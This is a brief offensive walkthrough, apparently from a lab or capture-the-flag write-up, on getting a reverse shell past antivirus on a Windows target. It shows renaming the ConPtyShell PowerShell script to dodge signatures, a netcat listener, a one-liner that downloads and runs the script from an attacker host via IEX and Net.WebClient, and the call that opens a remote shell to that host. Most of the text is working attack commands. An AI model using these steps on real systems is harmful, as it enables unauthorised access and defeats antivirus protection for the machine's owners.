
In order to bypass AV we can use 

```
https://github.com/antoniococo/conptyshell
```

I first modified the .ps1 script so it doesn't include ConPtyShell Name anymore and replaced it with the word "saitama", removed the whole how to description and changed the name of the script.

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Transfered the .ps1 script onto the target server.

```
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.57/av_evasion_rev.ps1")
```

Now we need to Invoke the Function, which we changed to "saitama".

```
saitama 10.10.14.57 3001
```
